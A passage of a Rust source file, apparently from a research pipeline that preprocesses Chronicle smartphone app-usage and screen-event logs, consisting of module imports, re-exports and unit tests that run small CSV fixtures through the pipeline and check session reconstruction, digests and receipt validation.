//! Chronicle preprocessing computations shared by the production query
//! Salsa engine and an independent cold-run test oracle.

use crate::payload_store::PayloadBytes;
use ahash::{AHashMap, AHashSet};
use blake3::Hasher as CheckpointHasher;
use chrono::{DateTime, Datelike, Duration, NaiveDate, Offset, TimeZone, Timelike};
use chrono_tz::Tz;
use csv_core::{ReadFieldResult, Reader as CsvReader};
use sha2::{Digest, Sha256};
use smallvec::SmallVec;
#[cfg(test)]
use std::cell::Cell;
use std::cell::RefCell;
use std::collections::{BTreeMap, BTreeSet, HashMap};
use std::sync::{Arc, OnceLock};
use xxhash_rust::xxh3::{xxh3_128, Xxh3};

use crate::b05_foundational_semantics::{self as b05, ScreenSessionConstructionStrategyId};
use crate::b06_maximum_duration as b06;
use crate::{parse_chronicle_timestamp_ns, weekday_chronicle, write_csv_field};

use _rust_app_usage_matcher::{split_overlapping_sessions, EpisodeCloseReason, UsageLayer};

#[cfg(test)]
use row_codec::{PersistedString, PersistedRowRef, intern_deserialized_str};
#[cfg(test)]
use checkpoint::{CheckpointSink};
#[cfg(feature = "incremental-v2")]
use checkpoint::{
    WORKFLOW_ROW_SCHEMA, checkpoint_for_reordered_exact_rows, checkpoint_hasher,
    finish_checkpoint_digest,
    workflow_rows_checkpoint_with_parts_and_canonical_order,
};
#[cfg(any(test, feature = "incremental-v2"))]
use checkpoint::{
    RowCheckpointScratch, WORKFLOW_CHECKPOINT_PROTOCOL, checkpoint_digest_fixed16,
    row_checkpoint_parts, terminal_checkpoint_digest,
    workflow_checkpoint_with_known_membership_and_order, workflow_checkpoint_with_reusable_rows,
};
#[cfg(feature = "incremental-v2")]
use output::{
    row_lineage_from_iter, screen_row_lineage_iter, write_app_csv_to,
    write_screen_csv_with_b05_to,
};
#[cfg(feature = "incremental-v2")]
use model::{SchoedelPreflightProduct};

#[cfg(test)]
use checkpoint::{
    BufferedCheckpointHasher, CHECKPOINT_HASH_BUFFER_BYTES, FingerprintSink,
    checkpoint_digest_positioned_fixed16_triple, checkpoint_digest_positioned_fixed16,
    reusable_row_components_from_parts, reusable_row_components_from_rows,
    workflow_checkpoint_with_group_parts, workflow_checkpoint_with_reusable_parts,
};
#[cfg(test)]
use output::{
    VISUALIZATION_DATA_B03_COLUMNS, VISUALIZATION_DATA_B03_PROTOCOL, VISUALIZATION_DATA_COLUMNS,
    VISUALIZATION_DATA_PROTOCOL, append_csv_field, begin_csv_field, build_app_columns,
    collapse_zero_mantissa, decimal_to_exponential, ecma_to_precision, emit_csv_i32,
    emit_event_timestamp, emit_screen_timestamp, emit_session_timestamp, round_to_precision,
    strip_exp_leading_zeros, to_exponential, write_event_timestamp_fmt, write_screen_csv,
    write_screen_timestamp_fmt, write_session_timestamp_fmt, ecma_to_fixed,
};
#[cfg(feature = "incremental-v2")]
use checkpoint::workflow_output_checkpoint;

pub use model::{RawRow, Row, RowData, MatcherInput, MatcherOutput};
use model::RowInner;
#[path = "pipeline/stage_functions.rs"]
mod stage_functions;
#[cfg(test)]
use source::{canonicalize_source_rows, decode_source_records};
#[cfg(test)]
use reconstruction::{classify_episode_durations, match_app_episodes_with_strategy};
#[cfg(test)]
use screen::classify_screen_sessions;
pub use stage_functions::StageFunctions;

#[path = "pipeline/payload.rs"]
mod payload;
pub(crate) use payload::{row_table_footprint, RowTableFootprint};
#[path = "pipeline/execution.rs"]
mod execution;

#[path = "pipeline/options.rs"]
mod options;
pub use options::{FilterMatchField, IntervalExpansionMethod, InteractionTypeRemovalMode, LockedScreenAudioDisposition, ScreenSessionClassificationPolicy, ScreenSessionMaximumDurationDisposition};
use support::AppFilterRules;
pub(crate) use screen::{apply_screen_session_policies, bound_app_rows_to_interactive_screen, screen_duration_excluded_participants, remove_participants};
pub use scientific::reconstruction_base_is_reusable;
use polled::materialize_behapp_half_open_seconds;
pub use options::{
    DayBoundaryAttribution, EpisodeReconstructionStrategy, EventRetentionSet,
    IntervalQualityPolicy, MaximumDurationValidation, MicroUseClassification,
    MicroUseClassificationPolicy, MinimumDurationComparator, MinimumDurationDisposition,
    NotificationProxyRule, OpenerSet, OpenerSetApplicability, OpenerSetRefusalReason,
    OptionVocabulary, AGGREGATE_SHAPES,
    OpenerStrategyRelation, PackageExclusionPreset, PipelineV2Options, PipelineV2OptionsJson,
    PipelineV2OptionsValidationError, PipelineV2SupportFiles, PolledEmulationMethod,
    PresenceTrackedOption, ScreenGatingRule, SessionBoundaryScope, SessionGapBasis,
    SessionGapThreshold, SessionGroupingPolicy, SessionGroupingRules, UsageSessionMode,
    maximum_duration_row_stage, opener_set_applicability, resolve_maximum_duration,
    validate_pipeline_v2_options, validate_pipeline_v2_options_with,
};
use options::{
    checked_minimum_duration_threshold_ns, default_true, minimum_duration_threshold_ns,
    seconds_to_ns_floor,
};

#[path = "pipeline/model.rs"]
mod model;
pub use model::{
    B05ComputationPhase, B05InputBoundary, B05OptionsDigestOrigin, B05PreflightError,
    B05PreflightIdentity, B05PreflightIdentityField, B05PreparedExecutionError,
    B05SchoedelPreflightResult, B05SchoedelPreparedInput, B05SchoedelValidationReceipt,
    B05SchoedelValidationStatus, B05ScreenPreparedSubstrate,
    B05_RETAINED_RAW_INPUT_REQUIRED_ERROR, B05_SCHOEDEL_PREFLIGHT_PROTOCOL_VERSION,
    B05_SCHOEDEL_VALIDATION_RECEIPT_PROTOCOL_VERSION, CodebookEntry,
    ConcurrentSubintervalFloorReceipt, EYES_INPUT_PARTITION_PREFLIGHT_PROTOCOL_VERSION,
    EYES_RETAINED_RAW_INPUT_REQUIRED_ERROR, EYES_TAGGED_FAU_VALIDATION_RECEIPT_PROTOCOL_VERSION,
    EyesInputPartitionOptionsDigestOrigin, EyesInputPartitionPreflightError,
    EyesInputPartitionPreflightIdentity, EyesInputPartitionPreflightResult,
    EyesInputPartitionRefusalReason, EyesTaggedFauValidationReceipt,
    EyesTaggedFauValidationStatus, FoundationalSemanticsEvidence, LineageSearchDigest,
    LineageSearchEvidence, MicroUseReceipt, MinimumDurationExcludedEpisode,
    MinimumDurationReceipt, OpenerSetEvidence, PREPROCESSOR_VERSION, ParticipantInputBoundary,
    CleaningCounts, PipelineRowLineage, PipelineV2Result, RETAINED_RAW_INPUT_REQUIRED_FOR_DECODE_ERROR,
    ScientificPreflightDisposition, ScreenIntervalLineage, SourceDataRowRange,
    TIMEZONE_HANDLING_MODES, WorkflowCheckpoint, ZeroDurationCleanupEvidence,
    ZeroDurationCleanupReceipt, ZeroDurationRemovedRow,
};
use model::{
    ACTIVITY_PAUSED, ACTIVITY_RESUMED, ACTIVITY_STOPPED, AMAZON_APPS, ANDROID_PSEUDO_PACKAGE,
    APP_USAGE, AttributedRows, AttributionCompleteness, AttributionCompletenessDay,
    AttributionMinutes, AttributionReport, B05RouterOptionsIdentity,
    B05SchoedelValidationContext, B05ScreenOptionsIdentity, BROAD_CATEGORY_COLUMNS,
    CODEBOOK_RENAME_PAIRS, COLLAPSED_GENRE_FIELD_INDICES, GENRE_ID_COLUMNS, CULVERHOUSE_BAD_APP_CAP_FLAG, CULVERHOUSE_BAD_APP_CAP_NS,
    CULVERHOUSE_COLLAPSED_FLAG, CULVERHOUSE_DST_DAY_FLAG, CULVERHOUSE_LONG_3H_FLAG,
    CULVERHOUSE_LONG_3H_NS, CULVERHOUSE_LONG_6H_FLAG, CULVERHOUSE_LONG_6H_NS,
    CULVERHOUSE_PARTIAL_DAY_FLAG, CULVERHOUSE_PARTIAL_DAY_GAP_HOURS,
    CULVERHOUSE_SAME_APP_COLLAPSE_NS, ComplianceDayCheckpoint, ComplianceResultCheckpoint,
    CoverageDayCheckpoint, CoverageOutput, CreditDecision, CreditEmission, CreditEmissionCounts,
    CreditInterval, CreditPartition, CreditPartitionCheckpoint, CreditReportOwned, CreditResult,
    DRAXLER_INACTIVITY_NS, DayApps, DayCoverageCheckpoint, END_OF_USAGE_MISSING,
    EyesInputPartitionOptionsIdentity, EyesTaggedFauValidationContext,
    FILTERED_APP_BACKGROUND_USAGE, FILTERED_APP_USAGE, FILTERED_PAUSED, FILTERED_RESUMED,
    FILTERED_STOPPED, FOREGROUND_EVENTS, FOUNDATIONAL_SEMANTICS_CHECKPOINT,
    FoundationalEpisodeEvidence, GESIS_EVENT_THRESHOLD, GESIS_MAX_TIMEOUT_NS,
    GESIS_START_EVENTS, GESIS_STOP_EVENTS, GESIS_UNMATCHABLE_STOP_EVENTS, InlineLineageDigest,
    KIDS_SHELL_PACKAGES, LOCK_SCREEN_EVENTS, MEANINGFUL_ACTIVITY_EVENTS,
    MORRISON_LOCK_TIMEOUT_NS, MergedMatcherOutput, NO_ACTIVITY_PLACEHOLDER_PACKAGE,
    NON_TARGET_PARTICIPANT_APP_USAGE, NOTIFICATION_INTERRUPTION, NOTIFICATION_OUTSIDE_USAGE_FLAG,
    NOTIFICATION_PROXY_FLAG_PREFIX, NOTIFICATION_SEEN, NOTIFICATION_WITHIN_USAGE_FLAG,
    NotificationContactCounts, NotificationContactOutput, OKOSHI_MICRO_USE_THRESHOLD_NS, ObservedUsageSpanGroup, ObservedUsageSpans,
    POLLED_EMULATION_FLAG_PREFIX, POLLED_EMULATION_FORCED_TERMINAL_FLAG,
    POLLED_EMULATION_NOT_OBSERVED_FLAG, PolledEmulationOutput, PolledRun,
    PolledSample, ResolvedParticipantWindow, RowCountReport,
    SCREEN_START_EVENTS, SCREEN_STOP_EVENTS, SCREEN_USAGE, SchoedelOptionsIdentity,
    SchoedelValidationWitness, ScreenChangePoint, ScreenCreditOutput, ScreenCreditState,
    ScreenCreditSubstrate, SharedString, SharingEntry, SharingResolution,
    SharingResolutionValue, SharingStatus, SourceDataRows, StudyWindow, StudyWindowExclusion, SurveyLookup,
    TimezoneSelection, UNLOCK_EVENTS, WindowedRows, ZERO_DURATION_CLEANUP_CHECKPOINT,
};

#[path = "pipeline/row_codec.rs"]
mod row_codec;
pub(crate) use row_codec::{
    compact_deserialized_row_payload, decode_row_lineage_payload, encode_row_lineage_payload,
    with_deserialized_row_string_pool, with_serialized_row_string_table,
};
use row_codec::{
    SharedStringPool, deserialize_codebook_fields, deserialize_lineage_searches,
    deserialize_screen_lineage, deserialize_shared_arc_string, empty_codebook_fields,
    empty_codebook_fields_ref, empty_lineage_searches, serialize_codebook_fields,
    serialize_lineage_searches, serialize_shared_arc_string, shared_lineage_text,
};

#[path = "pipeline/checkpoint.rs"]
mod checkpoint;
pub use checkpoint::{validate_workflow_checkpoint_for_subject};
pub(crate) use checkpoint::{value_fingerprint};
use checkpoint::{
    RowCheckpointParts, checkpoint_digest_field, checkpoint_for_exact_row_state,
    checkpoint_for_exact_state, neutral_b05_screen_construction_checkpoint,
    record_workflow_checkpoint, row_checkpoint_parts_for_rows, row_parts_sequence_digest,
    row_reference_sequence_digest, session_grouping_checkpoint_payload,
    timezone_retained_source_rows_digest, timezone_stage_digest, workflow_checkpoint,
    workflow_checkpoint_with_parts,
    workflow_rows_checkpoint, workflow_rows_checkpoint_reusing_last, workflow_state_checkpoint,
};

#[path = "pipeline/output.rs"]
mod output;
pub use output::{
    codebook_column_renames, declared_app_output_columns, declared_screen_output_columns,
    declared_screen_output_columns_for_strategy, insert_conditional_app_output_columns,
    normalize_float_string,
};
use output::{
    CountingSink, LocalDateMemo, build_review_summary, build_row_lineage,
    build_row_lineage_from_iter, build_screen_row_lineage, build_visualization_data,
    codebook_col_indices, csv_escape_value, ecma_round_fixed_f64,
    fmt_session_timestamp, format_cadence_seconds, format_threshold,
    foundational_output_projection, headline_eligible_app_rows, js_number_to_string,
    participant_event_timestamps, ts_to_local, write_app_csv, write_app_csv_from_iter,
    write_selected_screen_csv,
};
#[cfg(any(test, feature = "incremental-v2"))]
use output::{compliance_csv};
#[cfg(test)]
use output::codebook_col_index;

#[cfg(test)]
use support::{
    normalize_support_date, parse_csv_to_records, parse_survey_timestamp_ns,
};
#[cfg(test)]
use scientific::{
    b05_router_options_digest, b05_schoedel_validation_digest, schoedel_options_digest,
};
#[cfg(test)]
use screen::{ScreenState};
#[cfg(test)]
use reconstruction::{
    empty_inline_lineage_search_suffix_digest, eyes_close_reason,
    inline_lineage_search_range_digest, match_app_episodes, materialize_candidate_episodes,
};
#[cfg(test)]
use source::{derive_time_gap_evidence};
#[cfg(test)]
use annotations::{suppress_excluded_timing};

#[path = "pipeline/stages/source.rs"]
mod source;
pub use source::{
    canonical_raw_participant_ids, canonical_raw_participant_keys, discover_timezones_v2_native, split_raw_by_study,
};
use source::{
    count_duplicate_groups, normalize_interaction_type_local, populate_time_columns,
};
#[cfg(any(test, feature = "incremental-v2"))]
use source::{
    attach_device_models, bind_processing_timestamp, coalesce_duplicate_event_keys, collect_timezone_observations, disambiguate_duplicate_timestamps, estimate_dominant_timezone, mark_gaps,
    remove_missing_timestamps, resolve_timezone_strategy, rows_are_event_ordered,
    rows_have_strictly_increasing_timestamps, standardize_event_clock, summarize_row_selection,
    validate_remap_rules,
};
#[cfg(test)]
use source::{
    raw_study_ids_to_split, unalign_duplicate_timestamps, order_source_records,
};

#[path = "pipeline/stages/support.rs"]
mod support;
pub use support::{
    validate_supplied_communication_relationships,
    validate_filter_file_for_preset, validate_support_csv,
};
use support::{
    parse_apps_forcing_csv, parse_background_apps_csv, parse_codebook_csv,
    parse_csv_to_records_with_physical_rows, parse_device_sharing, parse_enrolled_devices,
    parse_filter_csv, parse_study_windows, parse_survey_lookup,
};

#[path = "pipeline/stages/reconstruction.rs"]
mod reconstruction;
use reconstruction::{
    BoundSchoedelReconstruction, apply_event_retention, bound_schoedel_reconstruction,
    decode_matcher_payload, empty_lineage_search_suffix_digest, encode_blake3_digest,
    encode_matcher_payload, label_filtered_apps, lineage_search_range_digest,
    materialize_schoedel_candidate_rows, schoedel_opener_evidence,
};
#[cfg(any(test, feature = "incremental-v2"))]
use reconstruction::{
    apply_app_inclusion_policy, apply_maximum_duration_to_row, build_app_event_index,
    mark_app_policy_matches, mask_excluded_app_events,
    materialize_candidate_episodes_in_place,
    materialize_candidate_episodes_with_suffix, order_app_episodes, resolve_excluded_packages,
    segment_concurrent_usage, timing_blanked_packages,
};
#[cfg(any(test, feature = "incremental-v2"))]
use reconstruction::{
    inline_lineage_search_suffix_digests, retained_schoedel_events,
};

#[path = "pipeline/stages/annotations.rs"]
mod annotations;
use annotations::{
    add_app_usage_detail_columns, assign_usage_session_ids, collapse_app_genre,
    derive_broad_category, is_zero_duration_cleanup_candidate, join_codebook, mark_app_usage_flags,
    push_row_flag, split_sessions_at_local_midnight,
};
#[cfg(any(test, feature = "incremental-v2"))]
use annotations::{
    apply_episode_flags, collapse_app_genre_step, derive_broad_category_step,
    derive_engagement_basis, interval_quality_step, remove_selected_interaction_types,
    remove_zero_duration_rows,
};
#[cfg(any(test, feature = "incremental-v2"))]
use annotations::{
    apply_codebook_annotations, apply_review_annotations_one_pass,
    apply_static_review_annotations_fused, mark_app_usage_flags_row, prepare_usage_flags,
};
#[cfg(test)]
use annotations::{
    clear_filtered_usage_timing, collapse_app_genre_row, derive_broad_category_row,
    local_day_start_ns,
};

#[path = "pipeline/stages/screen.rs"]
mod screen;
pub use screen::{is_screen_session_start};
use screen::{
    chronicle_interval_inputs, chronicle_orphan_stop_issues, derive_screen_usage_sessions_full,
    finalize_chronicle_b05_screen, materialize_b05_screen_rows,
};
#[cfg(any(test, feature = "incremental-v2"))]
use screen::{
    index_keyguard_events,
    infer_screen_session_skeletons,
};
pub use screen::{ScreenSessionClose, ScreenClassificationSettings};

#[cfg(test)]
use credit::{reference_alive_intervals};

#[path = "pipeline/stages/credit.rs"]
mod credit;
#[cfg(any(test, feature = "incremental-v2"))]
use credit::{
    assemble_credit_outputs, build_activity_witness_indexes, derive_credited_intervals,
    identify_credit_eligible_sessions, materialize_credited_rows, screen_incapable_participants,
    summarize_daily_apps,
};
#[cfg(test)]
use credit::{
    build_alive_spans, build_screen_credit_substrate, clip_alive_spans,
    credit_lineage_contributors, creditable_intervals, intersect_intervals, is_credit_session,
    screen_source_event_suffix_digest, screen_witness_state,
};

#[path = "pipeline/stages/notification.rs"]
mod notification;
#[cfg(any(test, feature = "incremental-v2"))]
use notification::{
    classify_notification_contacts, index_observed_usage_spans, select_notification_events,
};

#[path = "pipeline/stages/polled.rs"]
mod polled;
#[cfg(any(test, feature = "incremental-v2"))]
use polled::{
    group_polled_runs, materialize_polled_rows, sample_polled_timeline,
};

#[path = "pipeline/stages/attribution.rs"]
mod attribution;
pub use attribution::matching_study_participant_id;
#[cfg(test)]
use attribution::sharing_status_for;
use attribution::{
    add_no_activity_placeholder_rows, apply_study_window, attribute_person, build_compliance_csv,
    build_day_coverage_csv, index_raw_dates, resolve_participant_windows,
};
#[cfg(any(test, feature = "incremental-v2"))]
use attribution::{
    accumulate_minutes, apply_compliance_threshold, build_coverage,
    compute_attribution_completeness, resolve_sharing, resolve_windows,
    synthesize_placeholder_rows,
};
#[cfg(test)]
use attribution::{
    numerical_id, window_for,
};

#[path = "pipeline/scientific.rs"]
mod scientific;
pub use scientific::{
    b05_schoedel_is_active, bind_b05_screen_substrate, eyes_complement_is_active, eyes_effective_options,
    minimum_duration_excluded_lineage_bytes, preflight_b05_schoedel,
    preflight_b05_schoedel_with_input_boundary, preflight_eyes_complement_input_partition,
    prepare_b05_schoedel, prepare_b05_schoedel_with_input_boundary, prepare_b05_screen_substrate,
    prepare_b05_screen_substrate_with_input_boundary, rebind_b05_schoedel_prepared,
    validate_b05_schoedel_validation_receipt_integrity,
    validate_eyes_tagged_fau_validation_receipt_integrity,
    validate_foundational_semantics_evidence_for_options,
    validate_minimum_duration_excluded_lineage, validate_prepared_b05_schoedel,
    validate_prepared_b05_schoedel_with_input_boundary, validate_zero_duration_cleanup_evidence,
    validate_zero_duration_cleanup_lineage, validated_b05_schoedel_receipt,
    validated_eyes_tagged_fau_receipt, zero_duration_removed_lineage_bytes,
};
pub(crate) use scientific::{
    bind_finalized_b05_preflight, inactive_b05_preflight, validate_verified_request_options_digest,
};
#[cfg(test)]
use scientific::sha256_jcs;
#[cfg(test)]
use scientific::requires_b05_screen_validation;
use scientific::{
    PreflightRows, attach_concurrent_subinterval_floor_evidence,
    attach_zero_duration_cleanup_evidence, b05_evidence_assignment_digest,
    b05_identity_from_support, b05_schoedel_refusal_error,
    b05_screen_options_digest,
    eyes_input_partition_identity_from_support,
    eyes_input_partition_refusal_error, foundational_semantics_evidence,
    maximum_duration_evidence_for_rows, parse_schoedel_capability_evidence,
    participant_input_boundary_from_support, preflight_eyes_input_partition_with_raw_digest,
    raw_b05_events, schoedel_is_active,
    sha256_wire, validate_prepared_b05_schoedel_with_raw_digest,
};
#[cfg(any(test, feature = "incremental-v2"))]
use scientific::{
    canonicalize_foundational_episode_evidence, foundational_episode_evidence_from_rows,
    foundational_semantics_evidence_for_episode_evidence,
    foundational_semantics_evidence_for_policies, maximum_duration_evidence_for_episode_evidence,
    validate_micro_use_receipt_shape,
    validate_minimum_duration_receipt_shape, zero_duration_cleanup_evidence,
};

#[path = "pipeline/sequential.rs"]
mod sequential;
pub use sequential::{
    run_pipeline_v2_with_supports_and_dependencies, prepare_sequential_run_with_dependencies,
    prepare_sequential_run_with_verified_input_and_dependencies,
    sequential_scientific_preflight_with_stages,
    sequential_scientific_preflight_with_verified_input_and_stages, VerifiedRawInput,
    PreparedSequentialRun, prepare_sequential_run, run_pipeline_v2,
    run_pipeline_v2_with_background, run_pipeline_v2_with_prepared_b05,
    run_pipeline_v2_with_supports, run_prepared_sequential, sequential_scientific_preflight,
};
use sequential::{QueryCheckpointRecorder};

#[path = "pipeline_v2_aggregates.rs"]
pub mod aggregates;
#[path = "pipeline_v2_incremental.rs"]
mod incremental;
#[cfg(feature = "incremental-v2")]
pub use incremental::{
    reconstruction_base_header_bytes, review_base_header_bytes, select_persisted_review_base,
    IncrementalPipelineV2Engine, IncrementalPipelineV2Execution, PersistedReviewBaseSelection,
    RawCsvBytes,
};

#[cfg(test)]
thread_local! {
    static B05_PREPARE_DECODE_COUNT: Cell<usize> = const { Cell::new(0) };
    static B05_PREPARE_EVIDENCE_PARSE_COUNT: Cell<usize> = const { Cell::new(0) };
    static B05_SCREEN_CONSTRUCTION_COUNT: Cell<usize> = const { Cell::new(0) };
}

// ---- unit tests ---------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    const B05_IDENTITY_TEST_RAW: &[u8] = concat!(
        "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
        "Study,P01,Target Child,,Screen Interactive,android,2026-03-07 10:00:00,UTC\n",
        "Study,P01,Target Child,,Keyguard Hidden,android,2026-03-07 10:00:01,UTC\n",
        "Study,P01,Target Child,,Keyguard Shown,android,2026-03-07 10:01:00,UTC\n",
        "Study,P01,Target Child,,Screen Non-Interactive,android,2026-03-07 10:01:01,UTC\n",
    )
    .as_bytes();

    fn b05_capable_sidecar_for_participants(
        raw: &[u8],
        strategy: ScreenSessionConstructionStrategyId,
        participants: &[&str],
    ) -> Vec<u8> {
        let raw_digest = sha256_wire(raw);
        let mut csv = String::from(
            "schema_version,raw_input_sha256,participant_id,capability_id,state,evidence_basis,evidence_reference,evidence_sha256\n",
        );
        let capabilities = strategy
            .required_capability_ids()
            .iter()
            .copied()
            .chain([b05::CapabilityId::EqualTimestampSourceOrderPreserved])
            .collect::<BTreeSet<_>>();
        for participant in participants {
            for capability in &capabilities {
                csv.push_str(&format!(
                    "{},{},{},{},capable,study_protocol,fixture,\n",
                    b05::B05_INPUT_CAPABILITY_EVIDENCE_SCHEMA_VERSION,
                    raw_digest,
                    participant,
                    capability.canonical_id(),
                ));
            }
        }
        csv.into_bytes()
    }

    fn b05_capable_sidecar(raw: &[u8], strategy: ScreenSessionConstructionStrategyId) -> Vec<u8> {
        b05_capable_sidecar_for_participants(raw, strategy, &["P01"])
    }

    fn source_screen_options() -> PipelineV2Options {
        let mut options = test_options();
        options.usage_session_mode = UsageSessionMode::ScreenUsage;
        options.include_app_output = false;
        options.include_screen_output = true;
        options.screen_session_construction_strategy =
            ScreenSessionConstructionStrategyId::ParryToth2025SessionGlanceV1;
        options.screen_session_construction_strategy_explicit = true;
        options
    }

    #[test]
    fn sequential_screen_preflight_uses_the_same_source_order_drop_as_prepared_execution() {
        let raw = concat!(
            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
            "Study,P01,Target Child,,Screen Interactive,android,2026-03-07 10:00:00,UTC\n",
            "Study,P01,Target Child,,Screen Non-Interactive,android,2026-03-07 10:05:00,UTC\n",
            "Study,P01,Target Child,,Screen Interactive,android,2026-03-07 10:02:00,UTC\n",
            "Study,P01,Target Child,,Screen Non-Interactive,android,2026-03-07 10:06:00,UTC\n",
        ).as_bytes();
        let mut options = test_options();
        options.timezone = "UTC".into();
        options.usage_session_mode = UsageSessionMode::ScreenUsage;
        options.include_app_output = false;
        options.include_screen_output = true;
        options.drop_out_of_source_order_events = true;
        let options_digest = sha256_wire(b"source order drop preflight regression");
        let support = PipelineV2SupportFiles {
            verified_request_options_digest: Some(&options_digest),
            ..PipelineV2SupportFiles::default()
        };
        let (preflight, _) = sequential_scientific_preflight(raw, &options, support)
            .expect("normal source-order scientific preflight");
        let preflight_intervals = &preflight.screen_construction.as_ref()
            .expect("Chronicle screen construction").intervals;
        assert_eq!(preflight_intervals.len(), 1, "backward source open is dropped before construction");
        let prepared = prepare_sequential_run(raw, &options, support)
            .expect("prepare the same source-order request");
        let result = run_prepared_sequential(prepared, &options, support)
            .expect("execute the prepared source-order request");
        assert_eq!(result.screen_row_count, 1);
        assert_eq!(
            serde_json::to_value(preflight_intervals).unwrap(),
            serde_json::to_value(&result.b05_schoedel_preflight.screen_construction
                .as_ref().expect("executed screen construction").intervals).unwrap(),
            "preflight and prepared execution bind the same retained screen membership",
        );
    }

    #[test]
    fn app_only_screen_policies_activate_b05() {
        assert!(reconstruction_base_is_reusable(&test_options()));

        let mut maximum_exclusion = test_options();
        maximum_exclusion.screen_session_maximum_duration_minutes = 60.0;
        maximum_exclusion.screen_session_maximum_duration_disposition =
            ScreenSessionMaximumDurationDisposition::ExcludeParticipant;
        assert!(b05_schoedel_is_active(&maximum_exclusion));
        assert!(requires_b05_screen_validation(&maximum_exclusion));

        maximum_exclusion.screen_session_construction_strategy =
            ScreenSessionConstructionStrategyId::ParryToth2025SessionGlanceV1;
        assert!(!reconstruction_base_is_reusable(&maximum_exclusion));

        let mut locked_audio_exclusion = test_options();
        locked_audio_exclusion.locked_screen_audio_disposition =
            LockedScreenAudioDisposition::ExcludeFromPhoneAndAppSessions;
        assert!(b05_schoedel_is_active(&locked_audio_exclusion));
        assert!(requires_b05_screen_validation(&locked_audio_exclusion));
        assert!(!reconstruction_base_is_reusable(&locked_audio_exclusion));

        let mut schoedel = test_options();
        schoedel.episode_reconstruction_strategy =
            EpisodeReconstructionStrategy::Schoedel2026AppWithinScreenProseV1;
        assert!(!reconstruction_base_is_reusable(&schoedel));
    }

    const SCHOEDEL_PIPELINE_RAW: &[u8] = concat!(
        "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
        "Study,P01,Target Child,,Screen Interactive,android,2026-03-07 10:00:00,UTC\n",
        "Study,P01,Target Child,,Activity Resumed,app.a,2026-03-07 10:00:01,UTC\n",
        "Study,P01,Target Child,,Activity Paused,app.a,2026-03-07 10:00:02,UTC\n",
        "Study,P01,Target Child,,Activity Resumed,app.a,2026-03-07 10:00:03,UTC\n",
        "Study,P01,Target Child,,Activity Resumed,app.b,2026-03-07 10:00:05,UTC\n",
        "Study,P01,Target Child,,Activity Paused,app.b,2026-03-07 10:00:07,UTC\n",
        "Study,P01,Target Child,,Screen Non-Interactive,android,2026-03-07 10:00:08,UTC\n",
    )
    .as_bytes();

    fn schoedel_options() -> PipelineV2Options {
        let mut options = test_options();
        options.usage_session_mode = UsageSessionMode::AppUsage;
        options.episode_reconstruction_strategy =
            EpisodeReconstructionStrategy::Schoedel2026AppWithinScreenProseV1;
        options.filter_zero_duration_sessions = false;
        options
    }

    #[test]
    fn chronicle_and_schoedel_finalize_one_authoritative_pipeline_result() {
        let options = schoedel_options();
        let result = run_pipeline_v2_with_supports(
            SCHOEDEL_PIPELINE_RAW,
            &options,
            PipelineV2SupportFiles::default(),
        )
        .expect("Chronicle-backed Schoedel run");
        assert_eq!(
            result.b05_schoedel_preflight.screen_construction_phase,
            B05ComputationPhase::Finalized
        );
        assert_eq!(
            result.b05_schoedel_preflight.schoedel_reconstruction_phase,
            B05ComputationPhase::Finalized
        );
        let screen = result
            .b05_schoedel_preflight
            .screen_construction
            .as_ref()
            .expect("final screen receipt");
        assert_eq!(
            screen.applicability.input_digest,
            sha256_wire(SCHOEDEL_PIPELINE_RAW)
        );
        let episodes = &result
            .b05_schoedel_preflight
            .schoedel_reconstruction
            .as_ref()
            .expect("final Schoedel receipt")
            .episodes;
        assert_eq!(
            episodes
                .iter()
                .map(|episode| (
                    episode.package_name.as_str(),
                    episode.start_ns,
                    episode.stop_ns
                ))
                .collect::<Vec<_>>(),
            vec![
                (
                    "app.a",
                    1_772_877_601_000_000_000,
                    Some(1_772_877_603_000_000_000)
                ),
                (
                    "app.b",
                    1_772_877_605_000_000_000,
                    Some(1_772_877_607_000_000_000)
                ),
            ]
        );
        let app_csv = String::from_utf8(result.app_csv_bytes.to_vec()).unwrap();
        assert!(app_csv
            .lines()
            .next()
            .unwrap()
            .contains("screen_interval_id"));
        assert!(app_csv
            .lines()
            .next()
            .unwrap()
            .contains("schoedel_completion"));
        assert!(screen
            .intervals
            .iter()
            .all(|interval| app_csv.contains(&interval.screen_interval_id)));
        assert!(result.row_lineage.iter().any(|lineage| {
            lineage.output_kind.as_str() == "app-csv"
                && lineage.screen_interval_id().is_some()
                && lineage.schoedel_completion().is_some()
        }));
        let review = String::from_utf8(result.review_summary_json_bytes.to_vec()).unwrap();
        let visualization =
            String::from_utf8(result.visualization_data_json_bytes.to_vec()).unwrap();
        assert!(visualization.contains("\"protocolVersion\":\"chronicle-visualization-data/v3\""));
        for projection in [&review, &visualization] {
            assert!(projection.contains("foundationalProvenance"));
            assert!(projection.contains("schoedelEpisodeBindings"));
            assert!(episodes
                .iter()
                .all(|episode| projection.contains(&episode.episode_id)));
        }
    }

    #[test]
    fn fast_jcs_matches_serde_jcs_on_a_whole_pipeline_result() {
        let options = schoedel_options();
        let result = run_pipeline_v2_with_supports(
            SCHOEDEL_PIPELINE_RAW,
            &options,
            PipelineV2SupportFiles::default(),
        )
        .expect("validated Schoedel baseline");
        let preflight = &result.b05_schoedel_preflight;
        assert!(preflight.screen_construction.is_some());
        assert!(preflight.schoedel_reconstruction.is_some());
        assert!(!result.row_lineage.is_empty());
        assert_eq!(
            crate::jcs::to_vec(&result).unwrap(),
            serde_jcs::to_vec(&result).unwrap()
        );
        let receipt = validated_b05_schoedel_receipt(
            &result,
            &options,
            &sha256_wire(SCHOEDEL_PIPELINE_RAW),
            &preflight.options_digest,
            preflight.options_digest_origin,
        )
        .expect("validated receipt");
        assert_eq!(
            receipt.screen_construction_output_jcs_digest.as_deref(),
            Some(sha256_wire(&serde_jcs::to_vec(&preflight.screen_construction).unwrap()).as_str())
        );
        assert_eq!(
            receipt.finalized_preflight_jcs_digest,
            sha256_wire(&serde_jcs::to_vec(preflight).unwrap())
        );
    }

    #[test]
    fn live_b05_validation_marker_closes_preflight_and_lineage_tampering() {
        let options = schoedel_options();
        let baseline = run_pipeline_v2_with_supports(
            SCHOEDEL_PIPELINE_RAW,
            &options,
            PipelineV2SupportFiles::default(),
        )
        .expect("validated Schoedel baseline");
        let raw_digest = sha256_wire(SCHOEDEL_PIPELINE_RAW);
        let expected_options_digest = baseline.b05_schoedel_preflight.options_digest.clone();
